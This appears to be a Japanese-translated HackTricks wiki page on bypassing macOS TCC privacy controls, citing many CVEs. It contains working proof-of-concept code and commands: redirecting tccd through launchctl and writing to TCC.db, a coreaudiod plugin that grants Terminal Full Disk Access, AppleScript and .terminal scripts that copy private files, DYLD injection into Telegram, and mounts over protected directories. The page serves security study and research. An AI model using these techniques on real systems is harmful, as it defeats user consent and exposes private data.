# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 機能別

### Write Bypass

これはバイパスではなく、TCCの仕組みです。**書き込みからは保護されません**。Terminalに**ユーザーのDesktopを読み取るアクセス権がなくても、Desktop内に書き込むことは可能です**。
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**extended attribute `com.apple.macl`** は、新しい **file** に追加され、**creators app** にそのファイルの読み取りアクセスを与えます。

### TCC ClickJacking

ユーザーに気付かれないまま **accept** させるために、**TCC prompt の上に window を配置する**ことが可能です。[**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** に PoC があります。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker は **任意の名前**（Finder、Google Chrome など）を持つ **apps** を **`Info.plist`** 内に作成し、TCC で保護された場所へのアクセスを要求させることができます。ユーザーは、正規の application がこのアクセスを要求していると考えてしまいます。\
さらに、**Dock から正規の app を削除して fake app を配置する**ことも可能です。そのため、ユーザーが fake app（同じ icon を使用可能）をクリックすると、正規の app を呼び出し、TCC permissions を要求して malware を実行できます。これにより、ユーザーは正規の app がアクセスを要求したと信じてしまいます。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細情報と PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH 経由の access には "Full Disk Access" が付与されていました**。これを無効にするには、一覧に表示したうえで disabled にする必要があります（一覧から削除しても、これらの privileges は削除されません）。<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

ここでは、いくつかの **malwares がこの protection を bypass できた**事例を確認できます。

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> 現在、SSH を enable にするには **Full Disk Access** が必要です。

### Handle extensions - CVE-2022-26767

attribute **`com.apple.macl`** は、**特定の application にそのファイルの読み取り permissions を与えるために** files に付与されます。この attribute は、ファイルを app に対して **drag\&drop** したとき、またはユーザーがファイルを **double-click して default application で開いた**ときに設定されます。

したがって、ユーザーは **すべての extensions を処理する malicious app を登録**し、Launch Services を呼び出して任意のファイルを **open** させることができます（これにより、malicious file にそのファイルの読み取り access が付与されます）。

### iCloud

entitlement **`com.apple.private.icloud-account-access`** により、**iCloud tokens を提供する** **`com.apple.iCloudHelper`** XPC service と通信できます。

**iMovie** と **Garageband** には、この entitlement とそれを可能にするその他の entitlements がありました。

その entitlement から **icloud tokens を取得する** exploit の詳細については、talk [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup> を確認してください。

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission を持つ app は、**他の Apps を control** できます。つまり、**他の Apps に付与された permissions を abuse** できる可能性があります。

Apple Scripts の詳細については、以下を確認してください。


{{#ref}}
macos-apple-scripts.md
{{#endref}}

たとえば、ある App が **`iTerm` に対する Automation permission** を持っている場合、この例では **`Terminal`** が iTerm に access できます。

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA を持たない Terminal は iTerm（FDA を持つ）を呼び出し、iTerm を使って actions を実行できます。
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder経由

または、AppがFinderへのアクセス権を持っている場合、次のようなスクリプトを実行できます:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App behaviour 別

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland の **tccd daemon** は、**`HOME`** **env** 変数を使用して、次の場所にある TCC users database にアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[この Stack Exchange の投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) によると、また TCC daemon は現在のユーザーの domain 内で `launchd` 経由で実行されているため、TCC daemon に渡される **すべての environment variables を制御**できます。\
したがって、**attacker は `launchctl` で `$HOME` environment** 変数を **controlled** な **directory** を指すように設定し、**TCC** daemon を再起動して、エンドユーザーに一度も prompt を表示させることなく、**TCC database を直接変更**し、自身に利用可能な **すべての TCC entitlement** を付与できます。<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes は TCC protected locations にアクセスできましたが、note を作成するとこれは **protected ではない場所に作成されます**。そのため、Notes に protected file を note 内へコピーするよう要求し（つまり protected ではない場所に置き）、その後ファイルへアクセスできました。

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

library `libsecurity_translocate` を使用する binary `/usr/libexec/lsd` には、**nullfs** mount を作成できる entitlement `com.apple.private.nullfs_allow` と、すべてのファイルへアクセスできる **`kTCCServiceSystemPolicyAllFiles`** を持つ entitlement `com.apple.private.tcc.allow` が付与されていました。

"Library" に quarantine attribute を追加し、**`com.apple.security.translocation`** XPC service を呼び出すと、Library が **`$TMPDIR/AppTranslocation/d/d/Library`** に map され、Library 内のすべての documents に **アクセス**できました。

### CVE-2024-44131 - FileProvider symlink race

ファイル操作を **privileged helper**（ここでは **`fileproviderd`** / **`Files.app`**）に委譲する Apps は、ユーザーに代わって items をコピーまたは移動するため、copy は caller ではなく helper の privileges で実行されます。

Jamf Threat Labs は、operation 前に行われる symlink validation が **race 可能**であることを示しました。**最後の** path component（チェック対象）に symlink を配置する代わりに、copy の開始後に path の**中間** directory を attacker が置き換えます。すると privileged helper は attacker が制御する link をたどり、prompt を一度も表示せずに TCC-protected locations を読み書きします。<sup>[[7]](#references)</sup>

path 内で random UUID によって **protected されていない** directories（たとえば `~/Library/Mobile Documents/com~apple~CloudDocs`）は、race に使用する完全な path を attacker が予測できるため、最も容易な targets です。

> [!TIP]
> これは探すべき generic pattern です：**path を複数回 resolve する privileged process**（check-then-use、または `rename()` / `copyfile()` による source と destination の個別 resolve）は、path の中間にある directory を置き換えることで race 可能です。`O_NOFOLLOW_ANY`、すでに open された directory FD に対する `openat()`、または `realpath()` + 再 validation のみが、実際にこの window を閉じます。

詳しくは [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) を参照してください。<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` は `SQLITE_ENABLE_SQLLOG` を有効にして build でき、environment variables によって動作する logging hook が追加されます（upstream の `test_sqllog.c`）。<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **open されるすべての database** について、**database file の copy** と SQL statements の log が `path` に書き込まれます（directory は事前に存在している必要があります）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB が open / attach されるたびに、既存の copy を再利用せず **fresh copy** を作成します。
- **`SQLITE_SQLLOG_CONDITIONAL`** – main DB の隣に `<database>-sqllog` file が存在する場合のみ connection を log します。

FDA を持ち SQLite databases を open する process にこの variable を inject できれば、保護された databases をあなたが制御する directory に **copy** させることができます。destination filename は attacker-controlled data から派生するため、destination に配置した symlink によって、同じ primitive を target process の privileges による **arbitrary file write** に変えることができます。

### **SQLITE_AUTO_TRACE**

environment variable **`SQLITE_AUTO_TRACE`** が set されていると、library **`libsqlite3.dylib`** はすべての SQL queries の **logging** を開始します。多くの applications がこの library を使用していたため、それらの SQLite queries をすべて log できました。

複数の Apple applications が、この library を使用して TCC protected information にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes の探索

前の2つの項目は同じ汎用的な technique の実例であり、さらに多くの例を探す価値があります。**TCC-privileged apps にロードされる frameworks は、debug/logging 用の environment variables を公開していることが多く、これによりプロセスが caller-controlled path にファイルを作成します**。

それらを見つける workflow：

1. FDA またはその他の有用な TCC permission（`Music`、`TV`、`Terminal`、MDM agents...）を持つ target を選び、リンクしている frameworks を列挙します（`otool -L`、`vmmap`）。
2. それらの frameworks から `getenv` strings を grep します：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. `launchctl setenv NAME /path/you/control` で候補の variables を設定し、app を起動します。その後、`fs_usage -w -f filesys <pid>` または `sudo fs_usage | grep <path>` を使って filesystem 上での動作を監視します。
4. プロセスがあなたの directory 内にファイルを **作成または rename** する場合、write primitive を得たことになります。destination を symlink に指定する（または上記の CVE-2024-44131 のように intermediate directory と race する）ことで、書き込み先を `~/Library/Application Support/com.apple.TCC/TCC.db` に redirect できます。

> [!TIP]
> これには2つの制限があります。第一に、app が [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（「dynamic linker environment variables の影響を app が受ける可能性があることを示す Boolean value。これを使用して app の process に code を inject できる」）を持っていない限り、**`DYLD_*` variables は hardened-runtime binaries では無視されます** — [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) も参照してください。第二に、Apple は報告された個々の framework debug variables を削除します。そのため、ある macOS release で機能した variable が、次の release では存在しないことがよくあります。設定後に app が何も表示せず起動を拒否する場合、その variable はすでに filter されたものと考えてください。

linker variables を使った同等の trick については、[macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を参照してください。

### Apple Remote Desktop

root でこの service を有効にすると、**ARD agent は full disk access を持つことになり**、user がこれを abuse して新しい **TCC user database** を copy できる可能性があります。

## By **NFSHomeDirectory**

TCC は、user 固有の resources への access を制御するため、user の HOME folder 内に database を使用します：**$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
したがって、user が異なる folder を指す **$HOME** env variable を設定して TCC を restart させることに成功すると、user は **/Library/Application Support/com.apple.TCC/TCC.db** に新しい TCC database を作成し、TCC を trick して任意の app に任意の TCC permission を付与させることができます。

> [!TIP]
> Apple は、user profile に保存された **`NFSHomeDirectory`** attribute の値を **`$HOME`** の **value** として使用する点に注意してください。したがって、この value を変更する permission（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つ application を compromise した場合、この option を TCC bypass のために **weaponize** できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初の POC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して user の **HOME** folder を変更します。

1. target app 用の _csreq_ blob を取得します。
2. 必要な access と _csreq_ blob を含む fake _TCC.db_ file を plant します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) で user の Directory Services entry を export します。
4. Directory Services entry を変更して user の home directory を変更します。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) で変更した Directory Services entry を import します。
6. user の _tccd_ を stop し、process を reboot します。

2つ目の POC では、`kTCCServiceSystemPolicySysAdminFiles` を value とする **`com.apple.private.tcc.allow`** を持つ **`/usr/libexec/configd`** を使用しました。\
`configd` は **`-t`** option で実行でき、attacker は **custom Bundle to load** を指定できました。したがって、この exploit は user の home directory を変更する **`dsexport`** および **`dsimport`** method を **`configd` code injection** に置き換えます。

詳細については [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) を確認してください。<sup>[[13]](#references)</sup>

## By process injection

process 内部に code を inject し、その TCC privileges を abuse するには、さまざまな techniques があります。


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

さらに、TCC を bypass するために最も一般的に見つかる process injection は **plugins (load library)** によるものです。\
Plugins は通常 libraries または plist の形式の追加 code で、**main application によってロードされ**、その context 下で実行されます。したがって、main application が（付与された permissions または entitlements を通じて）TCC restricted files に access できる場合、**custom code も同じ access を持つことになります**。

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application は **`kTCCServiceSystemPolicySysAdminFiles`** entitlement を持ち、**`.daplug`** extension の plugins をロードしていました。また、hardened runtime を **使用していませんでした**。

この CVE を weaponize するには、TCC を bypass するため、**NFSHomeDirectory** を（前述の entitlement を abuse して）**変更**し、user の TCC database を **take over** できるようにします。

詳細については [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) を確認してください。<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary は `com.apple.security.cs.disable-library-validation` と `com.apple.private.tcc.manager` の entitlements を持っていました。前者は **code injection を可能にし**、後者は **TCC の manage access** を与えます。

この binary は `/Library/Audio/Plug-Ins/HAL` folder から **third party plug-ins** をロードできました。したがって、plugin を **load** して TCC permissions を abuse することが可能でした。この PoC は以下のとおりです：<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)を確認してください。<sup>[[15]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O経由でカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`**を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`（SIPによる制限対象外）にある**これらのプラグイン**をプロセス内にロードします。

そこにcommon **constructor**を含むライブラリを保存するだけで、**コードをinject**できます。

複数のAppleアプリケーションがこの脆弱性の影響を受けました。

### Firefox

Firefoxアプリケーションには、`com.apple.security.cs.disable-library-validation`および`com.apple.security.cs.allow-dyld-environment-variables`のentitlementsがありました。<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
詳細については、これを簡単に exploit する方法を[**original report で確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[16]](#references)</sup>

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には **`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** の entitlements があり、プロセス内に code を inject して TCC privileges を使用することが可能でした。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** の entitlements があり、これを abuse して、カメラでの recording など、Telegram の permissions に **access する**ことが可能でした。[**writeup で payload を確認できます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[17]](#references)</sup>

env variable を使用して library を load する方法に注目してください。この library を inject するために **custom plist** を作成し、`launchctl` を使用して起動しています:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open invocations による方法

sandboxed の状態でも **`open`** を invoke できます。

### Terminal Scripts

tech 関係者が使用するコンピューターでは、Terminal に **Full Disk Access (FDA)** を付与することがよくあります。また、それを使って **`.terminal`** scripts を invoke することも可能です。

**`.terminal`** scripts は、実行する command が **`CommandString`** key に記述された、次のような plist files です。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp などの場所にターミナルスクリプトを書き込み、次のような command で起動できます。
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（権限のないユーザーを含む）は、Time Machine snapshot を作成して mount し、その snapshot 内の**すべてのファイルにアクセス**できます。\
必要な**唯一の特権**は、使用するアプリケーション（`Terminal` など）に **Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることであり、これは管理者によって許可される必要があります。<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
より詳細な説明は[**original reportで確認できます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - TCC fileへのマウント

TCC DB fileが保護されていても、**directoryに新しいTCC.db fileをmountする**ことが可能でした：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit**は[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)で確認できます。

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)で説明されているように、このCVEは`diskarbitrationd`を悪用しました。<sup>[[18]](#references)</sup>

publicな`DiskArbitration` frameworkの`DADiskMountWithArgumentsCommon`関数がsecurity checkを実行していました。しかし、`diskarbitrationd`を直接呼び出すことでこれをbypassでき、その結果、path内で`../`要素やsymlinkを使用できました。

これにより、攻撃者は任意の場所にmountを実行できました。これには、`diskarbitrationd`が持つ`com.apple.private.security.storage-exempt.heritable` entitlementにより、TCC databaseへのmountも含まれます。

### asr

**`/usr/sbin/asr`** toolにより、disk全体をcopyして別の場所にmountし、TCC protectionsをbypassできました。

### CVE-2022-22655 - Location Services

Location Servicesは、他のservicesのようにTCC databaseには保存されません。独自のallow-listを**`/var/db/locationd/clients.plist`**に保持する`locationd`によって管理されています。<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
各エントリはクライアント（bundle ID または実行可能ファイルのパス）をキーとし、`Authorized`、`BundleId`、`Executable`、`Registered` などのフィールドを持ちます。

`clients.plist` ファイル自体は Sandbox/TCC によって保護されており、root であっても編集できません。しかし、**`/var/db/locationd/` ディレクトリは mount から保護されていませんでした**。そのため、root として実行される attacker は、独自の `clients.plist`（自身の binary に `Authorized` を設定したもの）を含む disk image を作成し、それをディレクトリに over mount してから `locationd` を restart することで、偽造した allow-list を有効にできました。<sup>[[5]](#references)</sup>

> [!TIP]
> これは、上記の `hdiutil`/`mount` TCC bypass と同じパターンです。*file* は保護されていますが、それが存在する *directory* は保護されていないため、file ではなく directory 全体を置き換えます。

## startup apps による方法


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep による方法

複数のケースで、file が emails、phone numbers、messages などの sensitive information を保護されていない場所に保存していました（これは Apple における vulnerability とみなされます）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これはもう機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) を使用する別の方法:<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework の bypass](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [macOS TCC User Privacy Protections を Accident と Design により bypass する](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [macOS Privacy Mechanisms を bypass する 20 以上の方法](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [TCC に対する Knockout Win - MacOS Privacy Mechanisms を bypass する 20 以上の新しい方法](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass（original report）](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [世界のどこにいる Carmen Sandiego：macOS の Location Services を Abusing する](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass により iCloud から data を steal](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c`（SQLITE_ENABLE_SQLLOG env variables）](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [XCSSET malware で Zero-Day TCC bypass を発見](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: 「Mac で起きたことは Apple の iCloud に残るのか?!」 - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [新しい macOS vulnerability「powerdir」は unauthorized user data access につながる可能性](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [home directory を変更して TCC を bypass（CVE-2020-27937）](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [music を再生して TCC を bypass（CVE-2020-29621）](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - macOS で Telegram を使用した TCC bypass](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Apple Vulnerabilities の解明：diskarbitrationd と storagekitd の Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
